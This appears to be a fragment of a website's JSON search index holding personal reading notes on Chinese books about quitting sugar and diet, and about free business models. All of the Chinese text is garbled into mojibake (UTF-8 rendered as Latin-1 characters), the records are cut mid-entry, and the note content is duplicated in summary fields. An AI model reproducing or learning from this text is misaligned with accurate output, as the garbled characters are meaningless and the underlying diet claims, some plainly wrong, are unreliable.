æœ€åå†åƒç¢³æ°´åŒ–åˆç‰© åªè¦å¥½å¥½å’€åš¼ï¼Œå°±èƒ½å‘å¤§è„‘çš„é¥±è…¹ä¸­æ¢å‘å‡ºâ€œåƒäº†å¾ˆå¤šâ€çš„ä¿¡å·ï¼Œæœ€ç»ˆå°±èƒ½å‡å°‘ç¢³æ°´åŒ–åˆç‰©çš„æ‘„å…¥é‡ã€‚ â€œåƒå®Œåé©¬ä¸Šè¿åŠ¨â€â€”â€”æŠµæ¶ˆåˆšåˆšåƒè¿›å»çš„ç¢³æ°´åŒ–åˆç‰© 12ç§’æ·±è¹²â€ï¼Œç‰¹åˆ«é€‚åˆé‚£äº›æ²¡æœ‰æ—¶é—´è¿åŠ¨çš„äººã€‚é¡¾åæ€ä¹‰ï¼Œæ¯æ¬¡æ·±è¹²åªéœ€12ç§’ã€‚æ…¢æ…¢è¹²ä¸‹æ¥ï¼Œæ…¢æ…¢ç«™èµ·æ¥ï¼Œè¿™ä¸ªåŠ¨ä½œå¯¹å¤§è…¿çš„è´Ÿè·å¾ˆå¤§ï¼Œæ•ˆæœå¾ˆå¥½ã€‚ è¿™æ ·åš10æ¬¡ï¼Œå°±èƒ½æŠµæ¶ˆåˆšåˆšåƒè¿›å»çš„ç¢³æ°´åŒ–åˆç‰©ã€‚ ç¬¬ä¸‰ç« å›é¡¾ ä¸€è¾ˆå­éƒ½ä¸å–å«ç³–çš„ç¢³é…¸é¥®æ–™ã€å«ç³–çš„ç½è£…å’–å•¡ç­‰é¥®æ–™ æ¥è‡ªå¾®ä¿¡è¯»ä¹¦","title":"#4 ç³–ä¸­æ¯’"},{"content":" æˆ’ç³–ï¼Œå…³é”®æ˜¯ç†è§£ä¸¤ä¸ªå­—\næˆ’ï¼šåº”å½“ç†è§£ä¸ºè­¦æˆ’ï¼Œè€Œä¸æ˜¯æˆ’é™¤ã€‚å®Œå…¨æˆ’é™¤æ˜¯ä¸å¯èƒ½çš„ ç³–ï¼šä¸èƒ½å•çº¯çš„åªç†è§£ä¸ºç”œé£Ÿã€ç™½ç ‚ç³–ä¹‹ç±»çš„å…·æœ‰ç”œå‘³çš„è§†é¢‘ã€‚å…·æœ‰ç”œå‘³åªæ˜¯å†°å±±ä¸€è§’çš„ç‰¹å¾ï¼Œæ›´å¤§çš„ç‰¹å¾æ˜¯ç¢³æ°´ç”»åˆç‰©ã€‚å˜´å·´èˆŒå¤´å–œæ¬¢çš„ä¸œè¥¿ï¼Œèƒƒã€å°è‚ ã€å°è‚ å¹¶ä¸ä¸€å®šå–œæ¬¢ã€‚å°±æ‹¿èˆŒå¤´å–œæ¬¢çš„â€œç”œã€é¦™ã€è½¯ã€ç³¯ã€é²œâ€æ¥è¯´ï¼Œè¿™éƒ¨åˆ†éƒ½å¯ä»¥ç®—ä½œç³–ç±»ã€‚ ã€Šæˆ’ç³–ï¼šæ”¹å˜ä¸€ç”Ÿçš„ç§‘å­¦é¥®é£Ÿæ³•ã€‹ åˆå¤ä¹‹è¡\n20ä¸ªç¬”è®°\næˆ’ç³–æˆ’æ‰çš„æ˜¯ä»€ä¹ˆï¼Ÿ â€œç©ºçƒ­é‡â€é£Ÿç‰©çš„æ¦‚å¿µå¾ˆå¥½ç†è§£ï¼ŒæŒ‡é™¤äº†èƒ½å¤Ÿç»™æˆ‘ä»¬çƒ­é‡ä¹‹å¤–ï¼Œæ²¡æœ‰å…¶ä»–å·²çŸ¥çš„è¥å…»ç›Šå¤„çš„é£Ÿç‰©ï¼Œè€Œæ¸¸ç¦»ç³–æ­£ç¬¦åˆè¿™ä¸€æ¦‚å¿µã€‚ é«˜ç³–é¥®é£Ÿï¼šå¯¹ä¸€ç”Ÿæœ‰å®³çš„ä¹ æƒ¯ æˆ’ç³–æ˜¯åœ¨å¤‡å­•æœŸé—´å°±åº”è¯¥ç€æ‰‹å…»æˆçš„è‰¯å¥½è¥å…»ä¹ æƒ¯ä¹‹ä¸€ã€‚çœŸæ­£è®©å­©å­èµ¢åœ¨èµ·è·‘çº¿ä¸Šçš„ï¼Œå¾€å¾€æ˜¯å¦ˆå¦ˆçš„é¥®é£Ÿå’Œèº«ä½“ç´ è´¨ã€‚ â€œç”Ÿé…®é¥®é£Ÿâ€çœŸçš„å¥åº·å—ï¼Ÿ æˆ‘ä»¬çš„èº«ä½“æ˜¯ä¸éœ€è¦æ¸¸ç¦»ç³–çš„ã€‚ä½†æ˜¯æˆ‘ä»¬çš„å¿ƒéœ€è¦å®ƒï¼Œè€Œä¸”è¿™ç§å¯¹ç”œçš„æ¸´æœ›å¹¶ä¸æ˜¯ä¸€ç§é”™ é£Ÿå“é…æ–™è¡¨ã€è¥å…»æˆåˆ†è¡¨æ€ä¹ˆè¯»ï¼Ÿ ï¼Œå³æ¯å¤©éœ€æ±‚2000åƒå¡çƒ­é‡ï¼Œè›‹ç™½è´¨60å…‹ï¼Œè„‚è‚ª60å…‹ï¼Œç¢³æ°´åŒ–åˆç‰©300å…‹ï¼Œé’ 2000æ¯«å…‹ï¼Œç„¶åæŒ‰è¿™å‡ ä¸ªæ•°å€¼çš„ç™¾åˆ†æ¯”æ¥æ˜¾ç¤ºã€‚ æ¯100å…‹å¤§ç±³é¥­çº¦å«æœ‰26å…‹ç¢³æ°´åŒ–åˆç‰© å¦‚ä½•ç»¼åˆåˆ¤æ–­é£Ÿå“ä¸­çš„ç¢³æ°´åŒ–åˆç‰©å«é‡é«˜ä½ï¼Ÿ ç¢³æ°´åŒ–åˆç‰©åœ¨é£Ÿç‰©ä¸­ä¸»è¦æœ‰ä¸‰ç§å½¢æ€ï¼šè†³é£Ÿçº¤ç»´ã€æ·€ç²‰ä»¥åŠæ¸¸ç¦» æ‰€ä»¥è†³é£Ÿçº¤ç»´æ˜¯æœ‰èƒ½é‡æ•ˆåº”çš„ï¼Œå®ƒåœ¨è¥å…»å­¦ä¸­ç»Ÿä¸€çš„æŠ˜ç®—èƒ½é‡æ˜¯æ¯å…‹2åƒå¡ï¼Œæ˜¯å¯æ¶ˆåŒ–ç¢³æ°´åŒ–åˆç‰©çš„50%ã€‚ åœ¨çƒ­ä¸”æ¹¿æ¶¦çš„é£Ÿç‰©ä¸­ï¼Œæ·€ç²‰çš„å£æ„Ÿéå¸¸æ˜æ˜¾ï¼Œå°±æ˜¯â€œè½¯ä¹â€å’Œâ€œç³¯â€ è›‹ç™½è´¨å’Œæ·€ç²‰çš„æ··åˆä¼šè®©é£Ÿç‰©çš„å£æ„Ÿæ›´åŠ ç»µè½¯æ¹¿æ¶¦ï¼Œæ¯”å¦‚å¥¶é…ªè›‹ç³• æˆ‘å›½å›½å®¶æ ‡å‡†è§„å®šâ€œçº¯ç‰›å¥¶â€åªèƒ½å«æœ‰æ–°é²œç‰›ä¹³ï¼Œæ‰€ä»¥å¯ä»¥è®¤ä¸ºä»»ä½•åŠ äº†ç³–çš„ä¹³åˆ¶å“éƒ½å±äºâ€œè°ƒå‘³ä¹³ è‘¡è„ç³–æ˜¯è†³é£Ÿçº¤ç»´çš„ä¸€ç§ï¼‰ è¿›ä¸€æ­¥å‡å°‘è¡€ç³–æ³¢åŠ¨ï¼šåƒçš„é¡ºåºå¾ˆé‡è¦ 2024/11/05 å‘è¡¨æƒ³æ³•\nå…ˆåƒè”¬èœï¼Œæ¥ç€è‚‰ã€è›‹ç™½ã€æœ€åç±³é¥­\nåŸæ–‡ï¼šæœ€ååƒç¢³æ°´åŒ–åˆç‰©ä¸°å¯Œçš„é£Ÿç‰©\næœ€ååƒç¢³æ°´åŒ–åˆç‰©ä¸°å¯Œçš„é£Ÿç‰©\næŠ—ç³–åŠæ³•ä¹‹è¿åŠ¨ä¸æ€è€ƒ 2024/11/05 å‘è¡¨æƒ³æ³•\næ— è®ºå¦‚ä½•è¿åŠ¨ï¼Œéƒ½æ— æ³•å¼¥è¡¥è¿‡åº¦è¿›é£Ÿé€ æˆçš„ä¼¤å®³ã€‚\nåŸæ–‡ï¼šè¿‡åº¦è¿›é£Ÿé€ æˆçš„èƒ½é‡è´Ÿè½½è¿‡åº¦å¯¹æˆ‘ä»¬ç™¾å®³è€Œæ— ä¸€åˆ©ã€‚è¿™ä¸€ç‚¹ä»å¾®è§‚çš„èƒ½é‡ä»£è°¢ä¸Šæ¥è¯´å°±æ›´åŠ è¯´å¾—é€šäº†\nè¿‡åº¦è¿›é£Ÿé€ æˆçš„èƒ½é‡è´Ÿè½½è¿‡åº¦å¯¹æˆ‘ä»¬ç™¾å®³è€Œæ— ä¸€åˆ©ã€‚è¿™ä¸€ç‚¹ä»å¾®è§‚çš„èƒ½é‡ä»£è°¢ä¸Šæ¥è¯´å°±æ›´åŠ è¯´å¾—é€šäº†\næ‰€ä»¥åªæœ‰é€‚é‡åœ°åƒã€é€‚å½“åœ°åŠ¨æ‰æ˜¯å¹³è¡¡çš„å…»ç”Ÿä¹‹é“ã€‚è€Œé€‚é‡çš„ç¡®æ˜¯ä¸ªå¾ˆéš¾æŠŠæ¡çš„åº¦ï¼Œä½†æ˜¯åªè¦å¬ä»ä½ çš„èº«ä½“å’Œå†…å¿ƒï¼Œ\nç¬¬10ç«  æˆ’ç³–çš„å¦ä¸€ç§æ–¹å¼ï¼šè½»æ–­é£Ÿ [æ’å›¾] â€¢ â€œ5+2â€æ¨¡å¼ï¼šè¿™ä¸ªä¹Ÿæ˜¯éº¦å…‹å°”Â·è«æ–¯åˆ©åšå£«æå‡ºçš„ä¸€ä¸ªæ”¹è‰¯æ–¹æ³•ï¼Œå³ä»¥å‘¨ä¸ºå•ä½ï¼Œé€‰æ‹©ä»»æ„2å¤©ï¼ˆå¯ä»¥ä¸è¿ç»­ï¼‰è¿›è¡Œçƒ­é‡é™åˆ¶é¥®é£Ÿâ€”â€”åªåƒå¹³æ—¶çƒ­é‡çš„1/4ï¼Œå…¶ä»–5å¤©æ­£å¸¸è¿›é£Ÿã€‚ â€¢ ç¦æ­¢åŠ é¤æ¨¡å¼ï¼š æˆ’ç³–çš„ç»ˆæåŠ¨åŠ›æ¥æº é‚£äº›å……æ»¡æ¸¸ç¦»ç³–å’Œå¿«æ¶ˆåŒ–ç¢³æ°´åŒ–åˆç‰©çš„é£Ÿç‰©ï¼Œä¸€èˆ¬æ˜¯â€œç”œã€é¦™ã€è½¯ã€ç³¯â€å¿…å å…¶ä¸€çš„é£Ÿç‰©ï¼Œ æ¥è‡ªå¾®ä¿¡è¯»ä¹¦\n","permalink":"https://wdd.js.org/books/003-%E6%88%92%E7%B3%96-%E6%94%B9%E5%8F%98%E4%B8%80%E7%94%9F%E7%9A%84%E7%A7%91%E5%AD%A6%E9%A5%AE%E9%A3%9F%E6%B3%95/","summary":"æˆ’ç³–ï¼Œå…³é”®æ˜¯ç†è§£ä¸¤ä¸ªå­—\næˆ’ï¼šåº”å½“ç†è§£ä¸ºè­¦æˆ’ï¼Œè€Œä¸æ˜¯æˆ’é™¤ã€‚å®Œå…¨æˆ’é™¤æ˜¯ä¸å¯èƒ½çš„ ç³–ï¼šä¸èƒ½å•çº¯çš„åªç†è§£ä¸ºç”œé£Ÿã€ç™½ç ‚ç³–ä¹‹ç±»çš„å…·æœ‰ç”œå‘³çš„è§†é¢‘ã€‚å…·æœ‰ç”œå‘³åªæ˜¯å†°å±±ä¸€è§’çš„ç‰¹å¾ï¼Œæ›´å¤§çš„ç‰¹å¾æ˜¯ç¢³æ°´ç”»åˆç‰©ã€‚å˜´å·´èˆŒå¤´å–œæ¬¢çš„ä¸œè¥¿ï¼Œèƒƒã€å°è‚ ã€å°è‚ å¹¶ä¸ä¸€å®šå–œæ¬¢ã€‚å°±æ‹¿èˆŒå¤´å–œæ¬¢çš„â€œç”œã€é¦™ã€è½¯ã€ç³¯ã€é²œâ€æ¥è¯´ï¼Œè¿™éƒ¨åˆ†éƒ½å¯ä»¥ç®—ä½œç³–ç±»ã€‚ ã€Šæˆ’ç³–ï¼šæ”¹å˜ä¸€ç”Ÿçš„ç§‘å­¦é¥®é£Ÿæ³•ã€‹ åˆå¤ä¹‹è¡\n20ä¸ªç¬”è®°\næˆ’ç³–æˆ’æ‰çš„æ˜¯ä»€ä¹ˆï¼Ÿ â€œç©ºçƒ­é‡â€é£Ÿç‰©çš„æ¦‚å¿µå¾ˆå¥½ç†è§£ï¼ŒæŒ‡é™¤äº†èƒ½å¤Ÿç»™æˆ‘ä»¬çƒ­é‡ä¹‹å¤–ï¼Œæ²¡æœ‰å…¶ä»–å·²çŸ¥çš„è¥å…»ç›Šå¤„çš„é£Ÿç‰©ï¼Œè€Œæ¸¸ç¦»ç³–æ­£ç¬¦åˆè¿™ä¸€æ¦‚å¿µã€‚ é«˜ç³–é¥®é£Ÿï¼šå¯¹ä¸€ç”Ÿæœ‰å®³çš„ä¹ æƒ¯ æˆ’ç³–æ˜¯åœ¨å¤‡å­•æœŸé—´å°±åº”è¯¥ç€æ‰‹å…»æˆçš„è‰¯å¥½è¥å…»ä¹ æƒ¯ä¹‹ä¸€ã€‚çœŸæ­£è®©å­©å­èµ¢åœ¨èµ·è·‘çº¿ä¸Šçš„ï¼Œå¾€å¾€æ˜¯å¦ˆå¦ˆçš„é¥®é£Ÿå’Œèº«ä½“ç´ è´¨ã€‚ â€œç”Ÿé…®é¥®é£Ÿâ€çœŸçš„å¥åº·å—ï¼Ÿ æˆ‘ä»¬çš„èº«ä½“æ˜¯ä¸éœ€è¦æ¸¸ç¦»ç³–çš„ã€‚ä½†æ˜¯æˆ‘ä»¬çš„å¿ƒéœ€è¦å®ƒï¼Œè€Œä¸”è¿™ç§å¯¹ç”œçš„æ¸´æœ›å¹¶ä¸æ˜¯ä¸€ç§é”™ é£Ÿå“é…æ–™è¡¨ã€è¥å…»æˆåˆ†è¡¨æ€ä¹ˆè¯»ï¼Ÿ ï¼Œå³æ¯å¤©éœ€æ±‚2000åƒå¡çƒ­é‡ï¼Œè›‹ç™½è´¨60å…‹ï¼Œè„‚è‚ª60å…‹ï¼Œç¢³æ°´åŒ–åˆç‰©300å…‹ï¼Œé’ 2000æ¯«å…‹ï¼Œç„¶åæŒ‰è¿™å‡ ä¸ªæ•°å€¼çš„ç™¾åˆ†æ¯”æ¥æ˜¾ç¤ºã€‚ æ¯100å…‹å¤§ç±³é¥­çº¦å«æœ‰26å…‹ç¢³æ°´åŒ–åˆç‰© å¦‚ä½•ç»¼åˆåˆ¤æ–­é£Ÿå“ä¸­çš„ç¢³æ°´åŒ–åˆç‰©å«é‡é«˜ä½ï¼Ÿ ç¢³æ°´åŒ–åˆç‰©åœ¨é£Ÿç‰©ä¸­ä¸»è¦æœ‰ä¸‰ç§å½¢æ€ï¼šè†³é£Ÿçº¤ç»´ã€æ·€ç²‰ä»¥åŠæ¸¸ç¦» æ‰€ä»¥è†³é£Ÿçº¤ç»´æ˜¯æœ‰èƒ½é‡æ•ˆåº”çš„ï¼Œå®ƒåœ¨è¥å…»å­¦ä¸­ç»Ÿä¸€çš„æŠ˜ç®—èƒ½é‡æ˜¯æ¯å…‹2åƒå¡ï¼Œæ˜¯å¯æ¶ˆåŒ–ç¢³æ°´åŒ–åˆç‰©çš„50%ã€‚ åœ¨çƒ­ä¸”æ¹¿æ¶¦çš„é£Ÿç‰©ä¸­ï¼Œæ·€ç²‰çš„å£æ„Ÿéå¸¸æ˜æ˜¾ï¼Œå°±æ˜¯â€œè½¯ä¹â€å’Œâ€œç³¯â€ è›‹ç™½è´¨å’Œæ·€ç²‰çš„æ··åˆä¼šè®©é£Ÿç‰©çš„å£æ„Ÿæ›´åŠ ç»µè½¯æ¹¿æ¶¦ï¼Œæ¯”å¦‚å¥¶é…ªè›‹ç³• æˆ‘å›½å›½å®¶æ ‡å‡†è§„å®šâ€œçº¯ç‰›å¥¶â€åªèƒ½å«æœ‰æ–°é²œç‰›ä¹³ï¼Œæ‰€ä»¥å¯ä»¥è®¤ä¸ºä»»ä½•åŠ äº†ç³–çš„ä¹³åˆ¶å“éƒ½å±äºâ€œè°ƒå‘³ä¹³ è‘¡è„ç³–æ˜¯è†³é£Ÿçº¤ç»´çš„ä¸€ç§ï¼‰ è¿›ä¸€æ­¥å‡å°‘è¡€ç³–æ³¢åŠ¨ï¼šåƒçš„é¡ºåºå¾ˆé‡è¦ 2024/11/05 å‘è¡¨æƒ³æ³•\nå…ˆåƒè”¬èœï¼Œæ¥ç€è‚‰ã€è›‹ç™½ã€æœ€åç±³é¥­\nåŸæ–‡ï¼šæœ€ååƒç¢³æ°´åŒ–åˆç‰©ä¸°å¯Œçš„é£Ÿç‰©\næœ€ååƒç¢³æ°´åŒ–åˆç‰©ä¸°å¯Œçš„é£Ÿç‰©\næŠ—ç³–åŠæ³•ä¹‹è¿åŠ¨ä¸æ€è€ƒ 2024/11/05 å‘è¡¨æƒ³æ³•\næ— è®ºå¦‚ä½•è¿åŠ¨ï¼Œéƒ½æ— æ³•å¼¥è¡¥è¿‡åº¦è¿›é£Ÿé€ æˆçš„ä¼¤å®³ã€‚\nåŸæ–‡ï¼šè¿‡åº¦è¿›é£Ÿé€ æˆçš„èƒ½é‡è´Ÿè½½è¿‡åº¦å¯¹æˆ‘ä»¬ç™¾å®³è€Œæ— ä¸€åˆ©ã€‚è¿™ä¸€ç‚¹ä»å¾®è§‚çš„èƒ½é‡ä»£è°¢ä¸Šæ¥è¯´å°±æ›´åŠ è¯´å¾—é€šäº†\nè¿‡åº¦è¿›é£Ÿé€ æˆçš„èƒ½é‡è´Ÿè½½è¿‡åº¦å¯¹æˆ‘ä»¬ç™¾å®³è€Œæ— ä¸€åˆ©ã€‚è¿™ä¸€ç‚¹ä»å¾®è§‚çš„èƒ½é‡ä»£è°¢ä¸Šæ¥è¯´å°±æ›´åŠ è¯´å¾—é€šäº†\næ‰€ä»¥åªæœ‰é€‚é‡åœ°åƒã€é€‚å½“åœ°åŠ¨æ‰æ˜¯å¹³è¡¡çš„å…»ç”Ÿä¹‹é“ã€‚è€Œé€‚é‡çš„ç¡®æ˜¯ä¸ªå¾ˆéš¾æŠŠæ¡çš„åº¦ï¼Œä½†æ˜¯åªè¦å¬ä»ä½ çš„èº«ä½“å’Œå†…å¿ƒï¼Œ\nç¬¬10ç«  æˆ’ç³–çš„å¦ä¸€ç§æ–¹å¼ï¼šè½»æ–­é£Ÿ [æ’å›¾] â€¢ â€œ5+2â€æ¨¡å¼ï¼šè¿™ä¸ªä¹Ÿæ˜¯éº¦å…‹å°”Â·è«æ–¯åˆ©åšå£«æå‡ºçš„ä¸€ä¸ªæ”¹è‰¯æ–¹æ³•ï¼Œå³ä»¥å‘¨ä¸ºå•ä½ï¼Œé€‰æ‹©ä»»æ„2å¤©ï¼ˆå¯ä»¥ä¸è¿ç»­ï¼‰è¿›è¡Œçƒ­é‡é™åˆ¶é¥®é£Ÿâ€”â€”åªåƒå¹³æ—¶çƒ­é‡çš„1/4ï¼Œå…¶ä»–5å¤©æ­£å¸¸è¿›é£Ÿã€‚ â€¢ ç¦æ­¢åŠ é¤æ¨¡å¼ï¼š æˆ’ç³–çš„ç»ˆæåŠ¨åŠ›æ¥æº é‚£äº›å……æ»¡æ¸¸ç¦»ç³–å’Œå¿«æ¶ˆåŒ–ç¢³æ°´åŒ–åˆç‰©çš„é£Ÿç‰©ï¼Œä¸€èˆ¬æ˜¯â€œç”œã€é¦™ã€è½¯ã€ç³¯â€å¿…å å…¶ä¸€çš„é£Ÿç‰©ï¼Œ æ¥è‡ªå¾®ä¿¡è¯»ä¹¦","title":"#3 æˆ’ç³– æ”¹å˜ä¸€ç”Ÿçš„ç§‘å­¦é¥®é£Ÿæ³•"},{"content":" åœ¨çœ‹è¿™æœ¬ä¹¦ä¹‹å‰ï¼Œæˆ‘çŸ¥é“æœ‰ä»¥ä¸‹å‡ ç§å…è´¹çš„æ–¹å¼ã€‚\nå¹¿å‘Šï¼šä½ åœ¨Bç«™ã€æ²¹ç®¡ä¸Šçœ‹è§†é¢‘ä¸ç”¨èŠ±é’±ï¼Œä½†æ˜¯è§†é¢‘çš„ä¸­é—´ã€æˆ–è€…æ’­æ”¾å™¨çš„æ¨ªå¹…å¹¿å‘Šï¼Œéƒ½æ˜¯éœ€è¦å¹¿å‘Šä¸»ä»˜è´¹ã€‚ å¢å€¼æœåŠ¡ï¼šä½ åœ¨ç©ç‹è€…è£è€€æ—¶ï¼ŒåŸºæœ¬æ˜¯å…è´¹çš„ã€‚ä½†æ˜¯ç‹è€…è£è€€çš„å¹´æ”¶å…¥å´åå‡ äº¿ç¾å…ƒï¼Œå‡å¦‚ç‹è€…é‡Œ80%çš„ç”¨æˆ·æ˜¯ä¸ä»˜é’±çš„ï¼Œå¦å¤–20%æ˜¯ä»˜è´¹ç”¨æˆ·ã€‚ä¹Ÿå°±æ˜¯è¯´æ˜¯ç”±20%çš„ä»˜è´¹ç”¨æˆ·æ‰¿æ‹…äº†æˆæœ¬ï¼Œé‚£ä¹ˆä»–ä»¬ç†åº”æ‹¥æœ‰æ›´å¥½çœ‹çš„æœè£…å’Œé“å…·ï¼Œç”šè‡³æ›´å¥½çœ‹çš„èƒœç‡ã€‚æ‰€ä»¥ï¼Œä½œä¸ºç™½å«–ç”¨æˆ·ï¼Œä½ åº”è¯¥è¦æœ‰è‡ªçŸ¥ä¹‹æ˜ã€‚ ç‰ˆæœ¬å·®å¼‚ï¼šæ¯”å¦‚è½¯ä»¶æœ‰åŸºç¡€ç‰ˆæœ¬ï¼ŒåŠŸèƒ½è™½ç„¶å¤Ÿç”¨ï¼Œä½†æ˜¯ä¹Ÿæœ‰å„ç§é™åˆ¶ã€‚æƒ³è¦æ›´å¥½çš„æœåŠ¡ï¼Œéœ€è¦å‡çº§åˆ°proç‰ˆæœ¬ã€‚ é…é¢å·®å¼‚ï¼šä¾‹å¦‚æŸä¸ªè½¯ä»¶ï¼Œ30ç”¨æˆ·ä»¥å†…å…è´¹ï¼Œè¶…è¿‡30äººåˆ™æ”¶è´¹ã€‚ æ—¶é—´é™åˆ¶ï¼š åœ¨å›ºå®šçš„æ—¶é—´èŒƒå›´å†…å…è´¹ï¼Œä¾‹å¦‚å…è´¹å¯ä»¥ç”¨ä¸€å¹´ï¼Œè¶…è¿‡ä¸€å¹´åˆ™éœ€è¦ä»˜è´¹ å¼€å§‹å…è´¹ï¼Œç”¨æ¥åŸ¹å…»ç”¨æˆ·ä¹ æƒ¯ï¼ŒåŸ¹å…»éŸ­èœï¼Œå é¢†å¸‚åœºï¼Œç­‰æœªæ¥æŸä¸ªæ—¶é—´ç‚¹å†æ”¶è´¹ è¯•åƒè¯•ç©¿ æ¯”å¦‚ï¼Œç”¨ä»˜è´¹äº§å“æ¥è¡¥è´´å…è´¹äº§å“ï¼Œç”¨æ—¥åä»˜è´¹æ¥è¡¥è´´å½“å‰å…è´¹ï¼Œç”±ä»˜è´¹äººç¾¤æ¥ç»™ä¸ä»˜è´¹äººç¾¤æä¾›è¡¥è´´ã€‚ ç”¨å…è´¹çš„äº§å“å’ŒæœåŠ¡å»å¸å¼•ç”¨æˆ·ï¼Œç„¶åå†ç”¨å¢å€¼æœåŠ¡æˆ–å…¶ä»–äº§å“æ”¶è´¹ï¼Œå·²ç»æˆä¸ºäº’è”ç½‘å…¬å¸çš„æ™®éæˆé•¿è§„å¾‹ã€‚ ç”¨æˆ·ã€‚é€šå¸¸è€Œè¨€ï¼Œä¸€å®¶ç½‘ç«™ä¼šéµå¾ªâ€œ 5%å®šå¾‹â€ï¼Œä¹Ÿå°±æ˜¯è¯´ 5%çš„ä»˜è´¹ç”¨æˆ·æ˜¯ç½‘ç«™çš„æ‰€æœ‰æ”¶å…¥æ¥æºã€‚ ä¼å¾·æ²ƒå¾·æ˜ç™½â€œå…è´¹â€è¿™ä¸ªå­—çœ¼èƒ½é‡å¡‘é¡¾å®¢å¿ƒæ€ã€åˆ›é€ æ–°å¸‚åœºã€æ‰“ç ´æ—§ä¹ å¹¶è®©æ‰€æœ‰äº§å“çœ‹ä¸Šå»å…·æœ‰æ›´åŠ å¸å¼•äººçš„ç‹¬ç‰¹é­…åŠ›ã€‚ æ—æ—æ€»æ€»çš„å…è´¹å½’æ ¹ç»“åº•éƒ½è¡¨ç°ä¸ºåŒä¸€å®è´¨â€”è®©é’±åœ¨ä¸åŒçš„äº§å“ä¹‹é—´ã€äººä¹‹é—´ã€ç°åœ¨å’Œæœªæ¥ä¹‹é—´ã€ä¸ä¸é’±æ‰“äº¤é“çš„å¸‚åœºå’Œå›åˆ°é‡‘é’±å¸‚åœºä¹‹é—´è½¬ç§»ã€‚ ç»æµå­¦å®¶æŠŠå®ƒç§°åšâ€œäº¤å‰è¡¥è´´â€ï¼ˆ cross-subsidiesï¼‰ã€‚ ä½†æ˜¯å½“æŸæ ·å•†å“å…è´¹æ—¶ï¼Œä½ å°±å¿˜è®°äº†å®ƒçš„åå¤„äº†ã€‚ ä¸ˆå¤«ä¼šæœ‰ä¸€ç§çŸ›ç›¾å¿ƒæ€ï¼Œè§‰å¾—å’Œå¥¹ä¸€èµ·è¿‡ä¸ä¸‹å»ï¼Œä½†æ˜¯ç¦»å¼€å¥¹è‡ªå·±åˆè¿‡ä¸ä¸‹å»ã€‚ ç§‘å¹»å°è¯´ä¹‹æ‰€ä»¥å¼•äººå…¥èƒœï¼Œå°±åœ¨äºå®ƒæ­ç¤ºäº†äººç±»å¯¹è¿™ç§å¤§é”™ä½ä¼šä½œä½•ååº”ã€‚ æ–‡åŒ–ã€‚æ¢å¥è¯è¯´ï¼ŒåŒ®ä¹çš„ç»ˆç»“ä½¿æˆ‘ä»¬å˜å¾—æ‡’æƒ°ã€é¢“åºŸã€æ„šè ¢å’Œå‘é„™ã€‚ æˆ‘ä»¬å§‹ç»ˆè¢«è‡ªå·±ä¸æ›¾æ‹¥æœ‰çš„è€Œéå·²ç»æ‹¥æœ‰çš„äº‹ç‰©æ¿€åŠ±ç€ã€‚ æ‚²ç—›5é˜¶æ®µ æˆ‘ä»¬æœ€å¥½æ˜¯é€šè¿‡å¿ƒç†å­¦å®¶ä¼Šä¸½èç™½Â·åº“ä¼¯å‹’Â·ç½—æ–¯æå‡ºçš„â€œæ‚²ç—›äº”é˜¶æ®µâ€ç†è®ºæ¥è§£é‡Š å¦è®¤ æ„¤æ€’ å•†è®¨ ç»æœ› æ¥çº³ ","permalink":"https://wdd.js.org/books/002-%E5%85%8D%E8%B4%B9-%E5%95%86%E4%B8%9A%E7%9A%84%E6%9C%AA%E6%9D%A5/","summary":" åœ¨çœ‹è¿™æœ¬ä¹¦ä¹‹å‰ï¼Œæˆ‘çŸ¥é“æœ‰ä»¥ä¸‹å‡ ç§å…è´¹çš„æ–¹å¼ã€‚\nå¹¿å‘Šï¼šä½ åœ¨Bç«™ã€æ²¹ç®¡ä¸Šçœ‹è§†é¢‘ä¸ç”¨èŠ±é’±ï¼Œä½†æ˜¯è§†é¢‘çš„ä¸­é—´ã€æˆ–è€…æ’­æ”¾å™¨çš„æ¨ªå¹…å¹¿å‘Šï¼Œéƒ½æ˜¯éœ€è¦å¹¿å‘Šä¸»ä»˜è´¹ã€‚ å¢å€¼æœåŠ¡ï¼šä½ åœ¨ç©ç‹è€…è£è€€æ—¶ï¼ŒåŸºæœ¬æ˜¯å…è´¹çš„ã€‚ä½†æ˜¯ç‹è€…è£è€€çš„å¹´æ”¶å…¥å´åå‡ äº¿ç¾å…ƒï¼Œå‡å¦‚ç‹è€…é‡Œ80%çš„ç”¨æˆ·æ˜¯ä¸ä»˜é’±çš„ï¼Œå¦å¤–20%æ˜¯ä»˜è´¹ç”¨æˆ·ã€‚ä¹Ÿå°±æ˜¯è¯´æ˜¯ç”±20%çš„ä»˜è´¹ç”¨æˆ·æ‰¿æ‹…äº†æˆæœ¬ï¼Œé‚£ä¹ˆä»–ä»¬ç†åº”æ‹¥æœ‰æ›´å¥½çœ‹çš„æœè£…å’Œé“å…·ï¼Œç”šè‡³æ›´å¥½çœ‹çš„èƒœç‡ã€‚æ‰€ä»¥ï¼Œä½œä¸ºç™½å«–ç”¨æˆ·ï¼Œä½ åº”è¯¥è¦æœ‰è‡ªçŸ¥ä¹‹æ˜ã€‚ ç‰ˆæœ¬å·®å¼‚ï¼šæ¯”å¦‚è½¯ä»¶æœ‰åŸºç¡€ç‰ˆæœ¬ï¼ŒåŠŸèƒ½è™½ç„¶å¤Ÿç”¨ï¼Œä½†æ˜¯ä¹Ÿæœ‰å„ç§é™åˆ¶ã€‚æƒ³è¦æ›´å¥½çš„æœåŠ¡ï¼Œéœ€è¦å‡çº§åˆ°proç‰ˆæœ¬ã€‚ é…é¢å·®å¼‚ï¼šä¾‹å¦‚æŸä¸ªè½¯ä»¶ï¼Œ30ç”¨æˆ·ä»¥å†…å…è´¹ï¼Œè¶…è¿‡30äººåˆ™æ”¶è´¹ã€‚ æ—¶é—´é™åˆ¶ï¼š åœ¨å›ºå®šçš„æ—¶é—´èŒƒå›´å†…å…è´¹ï¼Œä¾‹å¦‚å…è´¹å¯ä»¥ç”¨ä¸€å¹´ï¼Œè¶…è¿‡ä¸€å¹´åˆ™éœ€è¦ä»˜è´¹ å¼€å§‹å…è´¹ï¼Œç”¨æ¥åŸ¹å…»ç”¨æˆ·ä¹ æƒ¯ï¼ŒåŸ¹å…»éŸ­èœï¼Œå é¢†å¸‚åœºï¼Œç­‰æœªæ¥æŸä¸ªæ—¶é—´ç‚¹å†æ”¶è´¹ è¯•åƒè¯•ç©¿ 